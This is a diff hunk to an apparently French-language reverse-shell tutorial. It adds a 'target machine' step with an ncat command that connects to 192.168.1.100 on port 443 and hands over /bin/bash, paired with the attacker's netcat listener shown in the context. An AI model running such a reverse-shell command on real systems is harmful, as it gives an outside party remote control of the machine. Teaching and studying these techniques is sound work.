@@ -42,6 +42,12 @@ Notre machine
 user@ip:/home/user $ sudo nc -lvnp 443
 ```
 
+Machine cible
+
+```shell
+root@raspberrypi:/# ncat 192.168.1.100 443 -e /bin/bash
+```
+
 
 
 
